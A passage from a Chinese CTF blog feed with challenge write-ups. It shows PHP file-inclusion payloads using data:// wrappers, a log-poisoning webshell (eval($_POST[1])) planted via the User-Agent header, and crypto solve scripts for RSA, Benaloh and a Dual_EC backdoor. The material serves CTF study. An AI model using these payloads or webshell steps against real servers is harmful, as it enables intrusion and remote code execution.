class="meta">?&gt;</span>&amp;a=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl flag.php&quot;);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>变成了文件包含</p><p><img src="../images/web/image-20220718144945562.png" alt="image-20220718144945562"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">c=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl fla*&quot;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">//还可以配合UA头执行日志包含</span></span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>UA头写马执行日志操作：</p><ol><li><p>先用c=/var/log/nginx/access.log发现能看日志<img src="../images/web/image-20220718161423024.png" alt="image-20220718161423024"></p></li><li><p>User-Agent头写马：</p><p><img src="../images/web/image-20220718161940874.png" alt="image-20220718161940874"></p><p>User-Agent: &lt;?php eval($_POST[1]);?&gt;</p></li><li><p>再看日志<img src="../images/web/image-20220718162107763.png" alt="image-20220718162107763"></p></li><li><p>然后就可以命令执行了：</p><p><img src="../images/web/image-20220718162135410.png" alt="image-20220718162135410"></p></li><li><p>1=system(“nl flag.php”);</p><p><img src="../images/web/image-20220718162225485.png" alt="image-20220718162225485"></p></li></ol><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>“/flag|php|file/i”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">c=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl fla*&quot;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">//还可以配合UA头执行日志包含</span></span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>和上一题差不多</p><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p><img src="../images/web/image-20220718165432040.png" alt="image-20220718165432040"></p><p>用<code>c=data://text/plain,&lt;?=phpinfo();?&gt;</code>测试后缀有无影响，发现无：</p><p><img src="../images/web/image-20220718170657074.png" alt="image-20220718170657074"></p><p> .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用。data协议后有个?&gt;,已经闭合前面的php代码，所以后面的php拼接，不会影响php代码的执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl fla*&quot;);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>“/[0-9]|~|`|\@|#|\$|\%|\^|\&amp;|*|\（|\）|-|\=|+|{|[|]|}|\:|\’|\”|\,|\&lt;|.|>|\/|\?|\\/i”</p><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;学点web&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="http://sh1k4ku.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>做题记录</title>
    <link href="http://sh1k4ku.github.io/2022/07/09/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://sh1k4ku.github.io/2022/07/09/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2022-07-09T08:46:05.000Z</published>
    <updated>2022-07-12T09:13:17.392Z</updated>
    
    <content type="html"><![CDATA[<p>做题</p><span id="more"></span><h1 id="cycling"><a href="#cycling" class="headerlink" title="cycling"></a>cycling</h1><h2 id="Carmichael-function"><a href="#Carmichael-function" class="headerlink" title="Carmichael function"></a>Carmichael function</h2><script type="math/tex; mode=display">定义为a^{m} \equiv 1 \;mod\;n成立的最小正整数m ，其中( a , n ) = 1 ，将m记作\lambda(n)\\ 换言之，如果a^{m} \equiv 1 \;mod\;n，则m\;|\;\lambda(n)</script><h2 id="Carmichael定理"><a href="#Carmichael定理" class="headerlink" title="Carmichael定理"></a>Carmichael定理</h2><script type="math/tex; mode=display">\lambda(p^r)=\left\{\begin{aligned}& \varphi(p^r) \;if\;p^r = \;2,3^r,4,5^r,7^r等奇数素数以及2、4 \\& \frac{1}{2}\varphi(p^r) \;if\;p^r = \;8,16,32,64等2的3次幂以上\\\end{aligned}\right.</script><h2 id="计算-lambda-n"><a href="#计算-lambda-n" class="headerlink" title="计算\lambda(n)"></a>计算<script type="math/tex">\lambda(n)</script></h2><p>由整数分解定理</p><script type="math/tex; mode=display">n = p{_{1}^{r_1}}p{_{2}^{r_2}}···p{_{n}^{r_n}}</script><p>那么</p><script type="math/tex; mode=display">\lambda(n) = lcm(\lambda(p{_{1}^{r_1}}),\lambda(p{_{2}^{r_2}}),···,\lambda(p{_{n}^{r_n}}))</script><p>h+1易分解为17个小素数，且没有2次及以上的素数</p><script type="math/tex; mode=display">\because h+1\; |\;\lambda(\lambda(n))\\\therefore 用primes相乘+1判断是否为素数，并凑出可能的\lambda(n)\\</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0x99efa9177387907eb3f74dc09a4d7a93abf6ceb7ee102c689ecd0998975cede29f3ca951feb5adfb9282879cc666e22dcafc07d7f89d762b9ad5532042c79060cdb022703d790421a7f6a76a50cceb635ad1b5d78510adf8c6ff9645a1b179e965358e10fe3dd5f82744773360270b6fa62d972d196a810e152f1285e0b8b26f5d54991d0539a13e655d752bd71963f822affc7a03e946cea2c4ef65bf94706f20b79d672e64e8faac45172c4130bfeca9bef71ed8c0c9e2aa0a1d6d47239960f90ef25b337255bac9c452cb019a44115b0437726a9adef10a028f1e1263c97c14a1d7cd58a8994832e764ffbfcc05ec8ed3269bb0569278eea0550548b552b1</span></span><br><span class="line">ct = <span class="number">0x339be515121dab503106cd190897382149e032a76a1ca0eec74f2c8c74560b00dffc0ad65ee4df4f47b2c9810d93e8579517692268c821c6724946438a9744a2a95510d529f0e0195a2660abd057d3f6a59df3a1c9a116f76d53900e2a715dfe5525228e832c02fd07b8dac0d488cca269e0dbb74047cf7a5e64a06a443f7d580ee28c5d41d5ede3604825eba31985e96575df2bcc2fefd0c77f2033c04008be9746a0935338434c16d5a68d1338eabdcf0170ac19a27ec832bf0a353934570abd48b1fe31bc9a4bb99428d1fbab726b284aec27522efb9527ddce1106ba6a480c65f9332c5b2a3c727a2cca6d6951b09c7c28ed0474fdc6a945076524877680</span></span><br><span class="line">h = <span class="number">2</span>**<span class="number">1025</span> - <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">r&#x27;http://factordb.com/api&#x27;</span>, params=&#123;<span class="string">&quot;query&quot;</span>: <span class="built_in">str</span>(h + <span class="number">1</span>)&#125;)</span><br><span class="line"></span><br><span class="line">primes = [<span class="built_in">int</span>(_[<span class="number">0</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> response.json().get(<span class="string">&quot;factors&quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> prod(primes) == h + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cands = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**<span class="built_in">len</span>(primes))):</span><br><span class="line">    tmp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">        <span class="keyword">if</span> k % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            tmp *= primes[i]</span><br><span class="line">        k //= <span class="number">2</span></span><br><span class="line">    tmp += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> is_prime(tmp):</span><br><span class="line">        cands.append(tmp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># check</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(cands))):</span><br><span class="line">    tmp_p = cands[i]</span><br><span class="line">    <span class="keyword">assert</span> is_prime(tmp_p)</span><br><span class="line">    <span class="keyword">assert</span> (h + <span class="number">1</span>) % (tmp_p - <span class="number">1</span>) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">L = prod(cands)</span><br><span class="line">d = <span class="built_in">int</span>(<span class="built_in">pow</span>(e, -<span class="number">1</span>, L))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(ct, d, n))))</span><br></pre></td></tr></table></figure><h1 id="benaloh"><a href="#benaloh" class="headerlink" title="benaloh"></a>benaloh</h1><p> public key cryptosystems， which is homomorphic.</p><h2 id="Key-Generation"><a href="#Key-Generation" class="headerlink" title="Key Generation"></a>Key Generation</h2><p>Given block size <em>r</em>, a public/private key pair is generated as follows:</p><ol><li><p>Choose large primes <em>p</em> and <em>q</em> such that <em>r | (p-1)</em>,  <em>gcd(r,  (p-1)/r) = 1</em>, and <em>gcd (r,(q - 1)) = 1</em>;</p></li><li><p>set <script type="math/tex">n = pq,  \phi = (p-1)(q-1)</script></p></li><li><script type="math/tex; mode=display">choose y \in Z{^*_n}\quad such\;that\;y^{\phi/r} \not\equiv1\;mod\;n</script><p><strong>Note:</strong> If <em>r</em> is composite, it was pointed out by Fousse et al. in 2011that the above conditions (i.e., those stated in the original paper) are insufficient to guarantee correct decryption</p></li><li><p>Set <script type="math/tex">x\;=\;y^{\phi/r}\;mod\;n</script></p><p>The public key is then <script type="math/tex">{\displaystyle y,n}</script>, and the private key is <script type="math/tex">{\displaystyle \phi ,x}</script></p></li></ol><h2 id="Message-Encryption"><a href="#Message-Encryption" class="headerlink" title="Message Encryption"></a>Message Encryption</h2><p>To encrypt message <script type="math/tex">m\in Z_r</script>:</p><ol><li>Choose a random <script type="math/tex">u \in Z{_n^*}</script>;</li><li>set <script type="math/tex">E_r(m) = y^mu^r\;mod\;n</script></li></ol><h2 id="Message-Decryption"><a href="#Message-Decryption" class="headerlink" title="Message Decryption"></a>Message Decryption</h2><p>To decrypt message <script type="math/tex">c\in Z{_n^*}</script>:</p><ol><li>comupte <script type="math/tex">a = c ^{\phi/r} \;mod n</script></li><li>output <script type="math/tex">m = log_x(a)</script>, i.e.,find m such that <script type="math/tex">x^m \;\equiv1 \; mod n</script></li></ol><p>Baby-step giant-step algorithm can be used to recover m in <script type="math/tex">O(\sqrt{r})</script> time and space</p><p>题里u是用lcg依次生成的，每四位对明文进行加密。我们可以知道前几组mask的值，所以相当于有4组（更多约出来也是这样的）三元方程。为了更好的求根，这里使用<script type="math/tex">GrÖbner</script>基，找到一组多项式理想的约化。求出的<script type="math/tex">GrÖbner</script>基有以下形式：</p><script type="math/tex; mode=display">c^{17} + B_0 = 0\\u + B_1*c=0\\a + B_2=0</script><p>又由lcg的推导有：</p><script type="math/tex; mode=display">x_{i+1}=ax_i+c=-B_2x_i+c=...=C_{i+1}c\\所以x{_{i}^{17}}=(C_ic)^{17}=C{_i^{17}}c^{17}=C{_i^{17}}(-B_0)\\而C_i已知，因此可求解</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">r = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">n, y = <span class="built_in">eval</span>(f.readline())</span><br><span class="line">R = Integers(n)</span><br><span class="line">z = <span class="built_in">list</span>(<span class="built_in">map</span>(R, f.readlines()))</span><br><span class="line"></span><br><span class="line">y = R(y)</span><br><span class="line">log = &#123;y^i: <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r)&#125;</span><br><span class="line"></span><br><span class="line">P.&lt;u, a, c&gt; = PolynomialRing(R)</span><br><span class="line"></span><br><span class="line">G = []</span><br><span class="line">f = u</span><br><span class="line"><span class="keyword">for</span> i, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">b&#x27;di&#x27;</span>.<span class="built_in">hex</span>()):</span><br><span class="line">G.append(f^r - z[i]/y^<span class="built_in">int</span>(m, <span class="number">16</span>))</span><br><span class="line">f = a*f + c</span><br><span class="line"></span><br><span class="line">B = Ideal(G).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(B)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f = -B[<span class="number">1</span>].monomial_coefficient(c)*c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(z)):</span><br><span class="line">flag += log[z[i]/(f.monomial_coefficient(c)^r*(-B[<span class="number">0</span>].constant_coefficient()))]</span><br><span class="line">f = -B[<span class="number">2</span>].constant_coefficient()*f + c</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;做题&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
    <category term="Carmichael function" scheme="http://sh1k4ku.github.io/tags/Carmichael-function/"/>
    
  </entry>
  
  <entry>
    <title>分区赛</title>
    <link href="http://sh1k4ku.github.io/2022/06/27/%E5%88%86%E5%8C%BA%E8%B5%9B/"/>
    <id>http://sh1k4ku.github.io/2022/06/27/%E5%88%86%E5%8C%BA%E8%B5%9B/</id>
    <published>2022-06-26T16:00:00.000Z</published>
    <updated>2022-06-28T08:43:26.601Z</updated>
    
    <content type="html"><![CDATA[<p>题不难，要查找信息and稳住心态</p><span id="more"></span><h1 id="dual"><a href="#dual" class="headerlink" title="dual"></a>dual</h1><p>前一部分是要用xy求椭圆曲线的生成参数；</p><p>后一部分是NSA的后门，是一个随机数发生器，用一系列貌似随机的数和椭圆上的点做乘积，最后输出低240位作为每一轮的结果。因为P, Q是固定的，椭圆曲线的参数也是固定的，P、Q之间必然存在一个线性关系，那么就用这个线性关系去预测下一次的结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from sys import stdout</span><br><span class="line">from fastecdsa.curve import P256</span><br><span class="line">from fastecdsa.point import Point</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from tqdm import trange</span><br><span class="line"></span><br><span class="line">VERBOSE = True</span><br><span class="line"></span><br><span class="line">G = P256.G</span><br><span class="line"></span><br><span class="line">def pad(s):</span><br><span class="line">    return s + (16 - len(s) % 16) * b&quot;\x00&quot;</span><br><span class="line"></span><br><span class="line">class PRNG:</span><br><span class="line">    def __init__(self, e, seed):</span><br><span class="line">        self.state = seed</span><br><span class="line">        self.Q = e * G</span><br><span class="line">        self.P = G</span><br><span class="line">        self.mask = 2**240 - 1</span><br><span class="line">        </span><br><span class="line">    def gen(self):</span><br><span class="line">        new_point = self.state * self.P</span><br><span class="line">        r = new_point.x</span><br><span class="line">        self.state = r</span><br><span class="line">        ret = r * self.Q</span><br><span class="line">        return ret.x &amp; self.mask</span><br><span class="line"></span><br><span class="line">def p256_mod_sqrt(c):</span><br><span class="line">    p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff</span><br><span class="line">    t1 = pow(c, 2, p)</span><br><span class="line">    t1 = (t1 * c) % p</span><br><span class="line">    t2 = pow(t1, 2**2, p)</span><br><span class="line">    t2 = (t2 * t1) % p</span><br><span class="line">    t3 = pow(t2, 2**4, p)</span><br><span class="line">    t3 = (t3 * t2) % p</span><br><span class="line">    t4 = pow(t3, 2**8, p)</span><br><span class="line">    t4 = (t4 * t3) % p</span><br><span class="line">    r = pow(t4, 2**16, p)</span><br><span class="line">    r = (r * t4) % p</span><br><span class="line">    r = pow(r, 2**32, p)</span><br><span class="line">    r = (r * c) % p</span><br><span class="line">    r = pow(r, 2**96, p)</span><br><span class="line">    r = (r * c) % p</span><br><span class="line">    return pow(r, 2**94, p)</span><br><span class="line"></span><br><span class="line">def find_point_on_p256(x):</span><br><span class="line">    # equation: y^2 = x^3-ax+b</span><br><span class="line">    y2 = (x * x * x) - (3 * x) + P256.b</span><br><span class="line">    y2 = y2 % P256.p</span><br><span class="line">    y = p256_mod_sqrt(y2)</span><br><span class="line">    return y2 == (y * y) % P256.p, y</span><br><span class="line"></span><br><span class="line">class Solve:</span><br><span class="line">    def __init__(self) -&gt; None:</span><br><span class="line">        self.conn = remote(&#x27;192.168.0.64&#x27;, 58010)</span><br><span class="line">        self.n = 15</span><br><span class="line">    </span><br><span class="line">    def s_3(self):</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;3&#x27;)</span><br><span class="line">        </span><br><span class="line">        x0 = eval(self.conn.recvline())</span><br><span class="line">        x = eval(self.conn.recvline())</span><br><span class="line">        y = eval(self.conn.recvline())</span><br><span class="line">        x1 = x[:self.n]</span><br><span class="line">        x2 = x[self.n:]</span><br><span class="line">        p_list = []</span><br><span class="line">        PR = PolynomialRing(Zmod(x0), &#x27;x&#x27;)</span><br><span class="line">        x_ = PR.gen()</span><br><span class="line">        f = x_ + y</span><br><span class="line">        sol = f.small_roots(X=2**20, beta=1./20)</span><br><span class="line">        p_list = [ZZ(gcd(t + y, x0)) for t in sol]</span><br><span class="line">        print(len(p_list))</span><br><span class="line">        e = min(p_list)</span><br><span class="line">        # print(set(p0) == set(p_list))</span><br><span class="line">        return e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def gen_prediction(self, observed, Q, d):</span><br><span class="line">        ret = []</span><br><span class="line">        for high_bits in trange(2**15): # 2**16: have sol, 2**15: 1/2 prob</span><br><span class="line">            guess = (high_bits &lt;&lt; (8 * 30)) | observed</span><br><span class="line">            on_curve, y = find_point_on_p256(guess)</span><br><span class="line"></span><br><span class="line">            if on_curve:</span><br><span class="line">                # use the backdoor to guess the next 30 bytes</span><br><span class="line">                point = Point(guess, y, curve=P256)</span><br><span class="line">                s = (d * point).x</span><br><span class="line">                r = (s * Q).x &amp; (2**(8 * 30) - 1)</span><br><span class="line">                ret.append(r)</span><br><span class="line"></span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">    def s_pred(self, e):</span><br><span class="line">        d = int(inverse(e, P256.q))</span><br><span class="line">        Q = e * G</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;1&#x27;)</span><br><span class="line">        observed = eval(self.conn.recvline())</span><br><span class="line">        # print(guess)</span><br><span class="line">        # pred = eval(self.conn.recvline())</span><br><span class="line">        # print(pred)</span><br><span class="line">        predicted = self.gen_prediction(observed, Q, d)</span><br><span class="line">        # print(len(predicted))</span><br><span class="line">        # print(pred in predicted)</span><br><span class="line">        </span><br><span class="line">        return predicted</span><br><span class="line">    </span><br><span class="line">    def s_2(self, pred):</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;2&#x27;)</span><br><span class="line">        self.conn.recvuntil(&#x27;ct: &#x27;)</span><br><span class="line">        ct = self.conn.recvline().strip()</span><br><span class="line">        ct = base64.b64decode(ct)</span><br><span class="line">        for nx in pred:</span><br><span class="line">            key = pad(long_to_bytes(nx))</span><br><span class="line">            cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">            pt = cipher.decrypt(ct)</span><br><span class="line">            if (all(64 &lt; x &lt; 128 for x in pt)):</span><br><span class="line">                print(pt)</span><br><span class="line">                self.conn.sendlineafter(&#x27;pt:&#x27;, base64.b64encode(pt))</span><br><span class="line">                self.conn.interactive()</span><br><span class="line">                return True</span><br><span class="line">        else:</span><br><span class="line">            self.conn.close()</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def s(self):</span><br><span class="line">        e = int(self.s_3())</span><br><span class="line">        pred = self.s_pred(e)</span><br><span class="line">        if (pred == 0):</span><br><span class="line">            self.conn.close()</span><br><span class="line">            return False</span><br><span class="line">        is_success = self.s_2(pred)</span><br><span class="line">        return is_success</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    while True:</span><br><span class="line">        print(&#x27;Begin try...&#x27;)</span><br><span class="line">        s = Solve()</span><br><span class="line">        is_success = s.s()</span><br><span class="line">        if (is_success):</span><br><span class="line">            break</span><br><span class="line">        print(&#x27;Failed&#x27;)</span><br></pre></td></tr></table></figure><p>因为环境问题最后在队友电脑上出的—</p><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p>送分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">lcm = <span class="number">4292158730589770192682795435047249488185453170529228019750042608688907718268448193363838203887391025871515871000364259326343790645215256385842265899206372365402431198699714374850409466996627163968391249416054093529090485677808301343590811445080871279796162536469847469761747058736980603093722710824453312207182881241846080117790728778291633761198069016865260030288832065807438020772711645648333908622890343009942617559434851450007195025869850769670769715654662127278293639938359741401336592219730356884542179574372134014927006215640945952229142436595334916765255426954857520777553915330597952622785359222832224632624</span></span><br><span class="line">c = <span class="number">4288727484183191191687364666620023549392656794153112764357730676861570386983002380982803054964588111708662498647767438881892355599604826306427809017097724346976778230464708540600157055782723189971534549543664668430013171469625043063261219462210251726207552819381767396148632877168530609902046293626355744288863460554297860696918890189350721960355460410677203131993419723440382095665713164422367291153108363066159712951217816814873413423853338021627653555202253351957999686659021298525147460016557904084617528199284448056532965033560516083489693334373695545423561715471204868795248569806148395196572046378679014697206</span></span><br><span class="line">N  = <span class="number">17168634922359080770731181740188997952741812682116912079000170434755630873073792773455352815549564103486063484001457037305375162580861025543369063596825489461609724794798857499401637867986508655873564997664216374116361942711233205374363245780323485119184650145879389879046988234947922412374890843297813248828996855478005656041814919367820336728271583686844991928889831691815821365423570311291064846736832327637944358854661523107817781673029406341843040857813841671405147146887291204140157388049394514390098066284975682117038362207142272098796924412602725857521665773622056312191400612944442008222587867782281556388669</span></span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(E, lcm)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + md5(long_to_bytes(<span class="built_in">pow</span>(c,d,N))).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;题不难，要查找信息and稳住心态&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
    <category term="ECC" scheme="http://sh1k4ku.github.io/tags/ECC/"/>
    
  </entry>
  
  <entry>
    <title>《一秒钟》观后感</title>
    <link href="http://sh1k4ku.github.io/2022/05/17/%E3%80%8A%E4%B8%80%E7%A7%92%E9%92%9F%E3%80%8B%E8%A7%82%E5%90%8E%E6%84%9F/"/>
